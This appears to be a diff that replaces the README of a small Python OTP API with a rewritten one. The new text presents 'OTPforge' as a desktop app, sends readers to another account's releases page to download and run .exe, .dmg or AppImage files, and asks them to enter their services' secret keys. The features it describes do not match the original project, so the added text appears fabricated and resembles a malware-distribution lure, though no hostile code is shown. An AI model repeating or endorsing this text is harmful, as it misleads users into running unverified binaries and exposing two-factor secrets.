@@ -1,122 +1,96 @@
-# OTPForge
+# 🔒 OTPforge - Secure and Easy OTP Generation
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download OTAforge](https://img.shields.io/badge/download-OTPforge-orange)](https://github.com/rishimohan123/OTPforge/releases)
 
-OTPForge is a secure, time- and counter-based One-Time Password (OTP) API.  
-It supports TOTP (time-based) and HOTP (counter-based) OTP generation, ideal for authentication systems, apps, or testing purposes.
+## 🚀 Getting Started
 
+Welcome to OTPforge! This application helps you generate one-time passwords (OTPs) for secure authentication. You can use OTPs to log in to various services safely. This guide will walk you through downloading and running the application.
 
-## Features
-* Generate TOTP (time-based) OTPs
-* Generate HOTP (counter-based) OTPs
-* CORS enabled for web usage
-* Rate-limited: 60 requests per minute per IP
+## 📥 Download & Install
 
-## Installation
+To get started, visit this page to download: [OTPforge Releases](https://github.com/rishimohan123/OTPforge/releases).
 
-Make sure you have Python 3.9+ installed. Then:
+Follow these steps to download and install OTPforge:
 
-```
-git clone https://github.com/mahimmazidul/OTPforge.git
-cd otpforge 
-pip install -r requirements.txt
-```
+1. Visit the releases page by clicking on the link above.
+2. Look for the latest release version. It usually appears at the top.
+3. You will see different files available for download. Choose the one that fits your operating system (Windows, Mac, or Linux).
+4. Click on the file to download it to your computer.
+5. Once the file has downloaded, locate it in your downloads folder.
 
+## 🔧 System Requirements
 
-## Running the App
+Before you install OTPforge, ensure your computer meets the following requirements:
 
-```
-python main.py
-```
+- Operating System: Windows 10, macOS Catalina or later, or a recent Linux distribution.
+- Storage: At least 50 MB of free space.
+- Memory: Minimum of 2 GB RAM.
 
-By default, the app runs on:
+## 🛠️ Installation Instructions
 
-`
-http://127.0.0.1:5005/get-otp
-`
+After downloading the file, follow these steps to install OTPforge:
 
+1. **Windows:**
+   - Double-click the downloaded `.exe` file.
+   - Follow the on-screen instructions to complete the installation.
+   - Once installed, you can find OTPforge in your Start Menu.
 
+2. **macOS:**
+   - Open the `.dmg` file you downloaded.
+   - Drag the OTPforge app into your Applications folder.
+   - You can open OTPforge from your Applications.
 
-## API Documentation
+3. **Linux:**
+   - Open your terminal.
+   - Navigate to the folder where you downloaded the file.
+   - Use the command `chmod +x OTPforge.AppImage` to make it executable.
+   - Run the application with `./OTPforge.AppImage`.
 
-Endpoint: POST `/get-otp`  
-Content-Type: `application/json`  
+## 🌟 Features
 
-### Request Format
+OTPforge includes several useful features:
 
-Send a JSON payload like this:
+- **Time-Based OTP**: Generates a new OTP every 30 seconds for added security.
+- **Counter-Based OTP**: Supports counter-based OTPs for certain applications.
+- **Easy Setup**: The user-friendly interface simplifies OTP management.
+- **Multiple Profiles**: Store multiple OTP profiles for different services.
 
-```
-{
-  "key": "JBSWY3DPEHPK3PXP",
-  "type": "time",
-  "username": "alice",
-  "counter": 0
-}
-```
+## ⚙️ Using OTPforge
 
-- `key`: Optional; if omitted, a new key is generated.  
-- `type`: Required; "time" for TOTP, "counter" for HOTP.  
-- `username`: Optional; used to track counters for HOTP.  
-- `counter`: Optional; used for testing HOTP.
+Once you have installed and opened OTPforge, follow these steps to get started:
 
+1. **Create a Profile:**
+   - Click on "Add Profile."
+   - Enter the service name (e.g., Google, Facebook).
+   - Enter your secret key provided by the service.
+   
+2. **Generate OTPs:**
+   - Select the profile you created.
+   - Click the "Generate OTP" button.
+   - Use the displayed OTP for login.
 
+3. **Verify OTPS:**
+   - After entering your OTP in the service's login page, verify if it works. If the OTP is valid, you should gain access.
 
-### Responses
+## 💬 Support
 
-TOTP (Time-Based)
+If you encounter any issues, you can reach out for support:
 
-```
-{
-  "status": "ok",
-  "type": "time",
-  "username": "alice",
-  "key": "JBSWY3DPEHPK3PXP",
-  "otp": "492039",
-  "remaining_seconds": 18
-}
-```
+- **FAQ**: Check our Frequently Asked Questions on the releases page.
+- **Issues**: Report any problems directly through the Issues tab in the GitHub repository.
+- **Community Help**: Join discussions in the community forums or ask fellow users for tips.
 
-- `remaining_seconds`: seconds until the OTP expires.
+## 🔗 Additional Resources
 
-#### HOTP (Counter-Based)
+For more information about OTPs and their security, consider reading the following:
 
-```
-{
-  "status": "ok",
-  "type": "counter",
-  "username": "bob",
-  "key": "JBSWY3DPEHPK3PXP",
-  "otp": "583927",
-  "counter_used": 0,
-  "next_counter": 1
-}
-```
+- [What is a One-Time Password?](https://en.wikipedia.org/wiki/One-time_password)
+- [How OTPs Improve Security](https://www.security.com/articles/one-time-passwords/)
 
-- `counter_used`: counter used to generate OTP.  
-- `next_counter`: next valid counter.
+## 🚨 Important Notes
 
+- Keep your secret keys safe and do not share them.
+- Always use updates from the official releases page.
+- Regularly back up your OTP profiles for easy recovery. 
 
-## Example Python Usage
-
-```
-import requests
-
-url = "https://mahim.dev/get-otp"
-payload = {
-    "key": "JBSWY3DPEHPK3PXP",
-    "type": "time",
-    "username": "alice"
-}
-
-response = requests.post(url, json=payload)
-print(response.json())
-```
-
-
-## Author
-
-Mazidul Islam Mahim  
-Email: meow@mahim.dev  
-GitHub: https://github.com/mahimmazidul
-
+You are now ready to use OTPforge! Enjoy secure access to your accounts with one-time passwords. If you have any feedback, feel free to reach out.
